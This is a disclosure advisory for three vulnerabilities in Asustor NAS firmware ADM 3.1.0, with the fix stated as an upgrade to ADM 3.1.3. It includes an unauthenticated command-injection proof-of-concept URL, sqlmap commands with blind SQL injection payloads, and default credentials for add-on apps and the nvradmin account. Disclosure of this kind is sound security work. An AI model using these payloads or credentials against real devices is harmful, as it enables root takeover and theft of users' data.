Issue:  The Asustor NAS appliance on ADM 3.1.0 and before suffer from
multiple critical vulnerabilities. The vulnerabilities were submitted
to Asustor in January and February 2018. Several follow-up requests
were made in an attempt to obtain vendor acknowledgement, however no
correspondance was ever received. Nevertheless, the vendor did patch
the RCE issue in the 3.1.3 ADM release on May 31, 2018.

Resolution: Upgrade to newest Asustor firmware, ADM 3.1.3.

CVE-2018-11510
Remote Command Execution (Unauthenticated)
CWE-78 - Improper Neutralization of Special Elements used in an OS Command
ASUSTOR ADM - 3.1.0.RFQ3
------------------------------------------

Weakness : The ASUSTOR ADM 3.1.0.RFQ3 NAS portal suffers from an
unauthenticated remote code execution vulnerability in the
portal/apis/aggrecate_js.cgi file by embedding OS commands in the
'script' parameter. The application fails to santitize user input
after the cgi file executes a call to a local shell script.

Example POC:
https://<IP>:8001/portal/apis/aggrecate_js.cgi?script=launcher%22%26ls%20-ltr%26%22

Exploitation of this vulnerability allows an attacker execution of
arbitrary commands on the host operating system, as the root user,
remotely and unauthenticated. This is a complete compromise of the
appliance.

CVE-2018-11511
Blind SQL Injections
CWE-89: Improper Neutralization of Special Elements used in an SQL Command
ASUSTOR Photo Gallery Application - ADM 3.1.0.RFQ3
------------------------------------------

Weakness : The tree list functionality in the photo gallery
application in ASUSTOR ADM 3.1.0.RFQ3 has a SQL injection
vulnerability that affects the 'album_id' or 'scope' parameter via a
photo-gallery/api/album/tree_lists/ URI.

POC
sqlmap -u "https://<IP>/photo-gallery/api/album/tree_lists/"
--data="album_id=123456789&start=0&limit=100&order=name_asc&api=v2"
  --random-agent --risk=2 --dbms=mysql

Parameter: album_id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: album_id=106299411 AND
4644=4644&start=0&limit=100&order=name_asc&api=v2

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: album_id=106299411 AND
SLEEP(5)&start=0&limit=100&order=name_asc&api=v2


sqlmap -u "https://IP/photo-gallery/api/photo/search/"
--data="keyword=jpg&scope=123456789&start=0&limit=100&order=name_asc&api_mode=browse&api=v2"
--random-agent --dbms=mysql --risk=2

Parameter: scope (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: keyword=jpg&scope=106299414 AND
SLEEP(5)&start=0&limit=100&order=name_asc&api_mode=browse&api=v2

CVE-2018-11509
Default credentials and remote access (Multiple Applications)
CWE-255 Credentials Management
ASUSTOR ADM 3.1.0.RFQ3
------------------------------------------

Weakness : When the end user completes setup for the ASUSTOR Nas
appliance, a single congratulations web page appears, usually on port
80, stating setup is complete. This "setup complete" web page however
is served publicly, and is available to anyone with no authentication.
>From this page it is possible to access all of the add-on applications
the end usr installs on the NAS, which are available from their online
repository, by simply browsing to each add-on directory.

For many of these apps, for example phpmyadmin. virtualbox, owncloud,
photo-gallery, etc., the files are installed under the /volume1/Web/
folder, which is t the same directory as the 'setup complete' page is
located.

URL http://<IP>/phpmyadmin/ username/password - root:admin
URL http://<IP>/virtualbox/ username/password - admin:admin
URL http://<IP>/wordpress/ setup file available

The application does prompt the user to change the admin account for
the NAS itself, however, the end user is never prompted to change the
default passwords on the add-on  applications.

This allows an attacker root level access to the application which in
turn can be used to upload a webshell onto the appliance. It also
allow access to all data the end user uploads to the NAS.

Furthermore, the NAS itself has a default account nvradmin, which has
permission to log into the admin portal. While the nvradmin account
does not have most admin permissions, it still allows an attacker to
access many of the browser file functions, and gain a foothold on the
appliance.

URL http://<IP>:8001/portal/ username/password nvradmin:nvradmin

An attacker can determine installed applications and attack default
credentials that are not changed upon NAS initialization, which
enables them to  compromise end user data or gain root access on the
appliance.
